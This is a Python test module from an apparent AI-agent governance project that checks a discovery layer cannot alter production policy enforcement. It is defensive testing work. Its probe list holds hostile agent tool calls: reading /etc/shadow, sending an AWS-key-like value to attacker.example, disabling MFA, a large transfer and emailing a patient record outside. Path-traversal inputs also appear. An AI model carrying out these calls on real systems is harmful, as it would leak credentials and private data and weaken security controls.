"""The authority invariant, proved rather than asserted.

    The system may discover that the map is wrong.
    It does not receive authority to redraw the border.

These are architectural safety requirements, not optional cleanup. If any of
them fails, LB-0 is not merely unproven — it is unsafe to run, because a
discovery layer that can reach production enforcement is exactly the failure
the blueprint's threat model exists to prevent.

This module is permitted to name the production enforcement surfaces; that is
why `authority.scan_static_authority` excludes `tests/`.
"""

from __future__ import annotations

import ast
import json
from pathlib import Path

import pytest

from living_boundary import authority
from living_boundary._repo_paths import ARTIFACTS_ROOT, ENGINE_ROOT, PACKAGE_ROOT
from living_boundary.evidence.provenance import ArtifactPathError, write_package
from living_boundary.ontology.candidate_schema import (
    AuthorityBoundaryError, CandidatePrimitive, CandidateStatus,
)

# The production decision path in this repository. `/v1/govern` is the HTTP
# surface in the sibling governance-service repo; the kernel below is what it
# calls, and it is what must be unreachable and unchanged.
PRODUCTION_CALLS = [
    {"tool": "read_file", "args": {"path": "/etc/shadow"}},
    {"tool": "http_request", "args": {"url": "https://attacker.example",
                                      "body": "AKIA..."}},
    {"tool": "transfer", "args": {"amount": 4_500_000, "to": "acct-9"}},
    {"tool": "update_security_policy", "args": {"mfa_required": False}},
    {"tool": "send_email", "args": {"to": "outside@evil.example",
                                    "body": "patient record"}},
]


def _fresh_kernel():
    from morrison_governance.core import GovernanceLayer
    from morrison_governance.domains import OmegaDomain
    from morrison_governance.kernel.gate import GovernanceKernel
    from morrison_governance.kernel.trust import Principal, SecurityContext

    layer = GovernanceLayer(
        domains=[OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY,
                 OmegaDomain.DATA_PRIVACY, OmegaDomain.ENTERPRISE],
        log_all=False)
    context = SecurityContext(
        principal=Principal(id="agent-1", tenant="tenant_a"),
        internal_email_domains=("corp.example",),
        internal_url_hosts=("intranet.corp.example",))
    return GovernanceKernel(layer=layer, context=context)


def _decisions():
    """Governance decisions, reduced to the fields that are supposed to be
    stable. Timings are excluded — they are wall-clock and would make an
    identity comparison meaningless."""
    kernel = _fresh_kernel()
    out = []
    for call in PRODUCTION_CALLS:
        decision = kernel.authorize(call)
        out.append({
            "verdict": decision.verdict, "layer": decision.layer,
            "rule": decision.rule, "reason": decision.reason,
            "requirement": decision.requirement,
            "action_hash": decision.action_hash,
            "capabilities": sorted(decision.capabilities),
        })
    return out, kernel.integrity()["ruleset_hash"]


# ── 1. static: there is no code path ────────────────────────────────────

def test_static_scan_finds_no_route_into_production_authority():
    violations = authority.scan_static_authority()
    assert not violations, "\n".join(violations)


def _package_modules():
    for path in sorted(Path(PACKAGE_ROOT).rglob("*.py")):
        relative = path.relative_to(PACKAGE_ROOT).as_posix()
        if relative.startswith("tests/") or "__pycache__" in relative:
            continue
        yield relative, ast.parse(path.read_text(encoding="utf-8"))


def _referenced_symbols(tree):
    """Identifiers the code actually USES.

    Deliberately AST rather than a text search, for the reason
    `morrison_governance/test_portable_paths.py` documents at length: a text
    scan also matches prose, and this package's docstrings explain at length
    which surfaces it must never touch. A guard that fires on its own
    documentation trains people to delete the documentation. String constants —
    including `authority.py`'s own denylist — are not references.
    """
    symbols = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Name):
            symbols.add(node.id)
        elif isinstance(node, ast.Attribute):
            symbols.add(node.attr)
        elif isinstance(node, ast.Import):
            for alias in node.names:
                symbols.add(alias.name)
                symbols.add((alias.asname or alias.name).split(".")[0])
        elif isinstance(node, ast.ImportFrom):
            if node.module:
                symbols.add(node.module)
            for alias in node.names:
                symbols.add(alias.name)
                if node.module:
                    symbols.add(f"{node.module}.{alias.name}")
    return symbols


def test_no_module_imports_an_enforcement_surface():
    """Belt and braces: assert the specific forbidden modules by name."""
    forbidden = set(authority.FORBIDDEN_MORRISON_MODULES)
    for relative, tree in _package_modules():
        leaked = forbidden & _referenced_symbols(tree)
        assert not leaked, f"{relative} imports {sorted(leaked)}"


def test_no_module_constructs_or_verifies_an_approval():
    """LB-0 must not be able to bypass approval verification — the cleanest
    form of which is never touching the approval machinery at all."""
    approval_surface = {"ApprovalArtifact", "issue_approval", "verified_approval",
                        "consume_nonce", "SecurityContext", "GovernanceKernel",
                        "signing_key", "trusted_issuers"}
    for relative, tree in _package_modules():
        leaked = approval_surface & _referenced_symbols(tree)
        assert not leaked, f"{relative} references {sorted(leaked)}"


def test_no_module_invokes_a_provider_or_executor():
    """No execution surface is called, so no provider action can be invoked."""
    for relative, tree in _package_modules():
        leaked = set(authority.FORBIDDEN_CALLS) & _referenced_symbols(tree)
        assert not leaked, f"{relative} calls {sorted(leaked)}"


def test_only_the_evidence_writer_touches_the_filesystem():
    writers = []
    for path in sorted(Path(PACKAGE_ROOT).rglob("*.py")):
        relative = path.relative_to(PACKAGE_ROOT).as_posix()
        if relative.startswith("tests/"):
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            name = (node.func.attr if isinstance(node.func, ast.Attribute)
                    else getattr(node.func, "id", ""))
            if name in authority.WRITE_CALLS or (
                    name == "open" and authority.write_mode(node)):
                writers.append(relative)
    assert set(writers) <= set(authority.WRITE_CAPABLE_MODULES), (
        "unexpected filesystem writers: {}".format(
            sorted(set(writers) - set(authority.WRITE_CAPABLE_MODULES))))


# ── 2. live: the refusal actually happens ───────────────────────────────

def test_cannot_transition_a_candidate_directly_to_enforced():
    candidate = CandidatePrimitive(candidate_id="CP-X", name="x", description="x")
    for forbidden in (CandidateStatus.ENFORCED, CandidateStatus.SHADOW,
                      CandidateStatus.APPROVED):
        with pytest.raises(AuthorityBoundaryError):
            candidate.advance(forbidden)


def test_promotion_refusal_check_passes():
    assert authority.check_promotion_refusal() == []


def test_evidence_writer_refuses_to_escape_the_artifacts_tree():
    for name in ("../../escape.json", "/etc/passwd", "a/../../../escape.json"):
        with pytest.raises(ArtifactPathError):
            write_package("lb0-test-escape", {name: "x"})


def test_artifacts_root_is_inside_the_prototype():
    assert authority.artifacts_root_is_isolated()
    assert Path(ARTIFACTS_ROOT).resolve().is_relative_to(
        Path(ENGINE_ROOT).resolve()) if hasattr(Path, "is_relative_to") else True


# ── 3. behavioural: production is unchanged, and unaffected by LB-0 failure ──

def test_living_boundary_cannot_mutate_runtime_policy():
    """A full LB-0 run must leave the production configuration byte-identical.

    The ruleset hash binds each rule's BYTECODE, constants and closure values,
    so this detects a rule whose logic changed even when its name did not —
    which is precisely the mutation a config-file diff would miss.
    """
    from living_boundary.run_lb0 import run

    before = authority.production_fingerprint()
    run(seed=7, stability_seeds=0, persist=False)
    after = authority.production_fingerprint()

    assert authority.compare_fingerprints(before, after) == []
    assert before["ruleset_hash"] == after["ruleset_hash"]
    assert before["capability_policy"] == after["capability_policy"]
    assert before["default_policy_values"] == after["default_policy_values"]


def test_living_boundary_cannot_modify_the_ontology_version():
    from living_boundary.ontology import versions
    from living_boundary.run_lb0 import run

    before = versions.BASELINE_ONTOLOGY_VERSION
    result = run(seed=7, stability_seeds=0, persist=False)
    assert versions.BASELINE_ONTOLOGY_VERSION == before
    assert result["ontology"]["mutable_by_living_boundary"] is False
    candidate = result["candidate_primitive"]
    if candidate:
        assert candidate["ontology_version_observed"] == before
        assert candidate["status"] != CandidateStatus.ENFORCED


def test_living_boundary_failure_does_not_change_v1_govern_behavior(monkeypatch):
    """Blueprint invariant 8: existing boundaries fail closed during a
    discovery-layer failure.

    LB-0 is forced to crash mid-run, and the production kernel is measured on
    both sides of the crash. The decisions must be identical, because the
    production path does not call into this package at all — which is the
    property being demonstrated.
    """
    from living_boundary import run_lb0

    before, ruleset_before = _decisions()

    monkeypatch.setattr(
        run_lb0, "generate_dataset",
        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("LB-0 exploded")))
    with pytest.raises(RuntimeError):
        run_lb0.run(seed=7, stability_seeds=0, persist=False)

    after, ruleset_after = _decisions()
    assert after == before, "a Living Boundary crash changed governance decisions"
    assert ruleset_after == ruleset_before

    # Every one of the probe calls must still be refused. A crash that turned
    # BLOCK into PERMIT would be catastrophic and silent.
    assert all(entry["verdict"] in ("BLOCK", "ESCALATE") for entry in after), (
        "probe calls must remain refused: {}".format(
            [(e["verdict"], e["rule"]) for e in after]))


def test_a_successful_run_also_leaves_governance_decisions_identical():
    from living_boundary.run_lb0 import run

    before, _ = _decisions()
    run(seed=7, stability_seeds=0, persist=False)
    after, _ = _decisions()
    assert after == before


# ── 4. the run reports the invariant, and could report a violation ──────

def test_authority_report_declares_production_unreachable():
    fingerprint = authority.production_fingerprint()
    report = authority.authority_report(fingerprint, fingerprint)
    assert report["production_authority_reachable"] is False
    assert all(check["passed"] for check in report["checks"].values())
    assert len(report["invariants"]) == len(authority.AUTHORITY_INVARIANTS)
    authority.require_no_authority(report)


def test_authority_report_can_fail():
    """A check that cannot fail is not a check.

    A changed production fingerprint must flip the verdict and raise.
    """
    before = authority.production_fingerprint()
    tampered = dict(before)
    tampered["ruleset_hash"] = "0" * 64
    report = authority.authority_report(before, tampered)
    assert report["production_authority_reachable"] is True
    with pytest.raises(authority.AuthorityViolation):
        authority.require_no_authority(report)


def test_the_only_lb0_outputs_are_candidates_and_evidence(tmp_path):
    """The permitted output surface, stated as a check on a real run."""
    from living_boundary.run_lb0 import run

    result = run(seed=7, stability_seeds=0, persist=False)
    payload = json.loads(json.dumps(result, default=str))
    assert set(payload) >= {"candidate_primitive", "evidence", "verdict",
                            "authority"}
    assert payload["authority"]["production_authority_reachable"] is False
    assert payload["production_fingerprint"]["unchanged"] is True
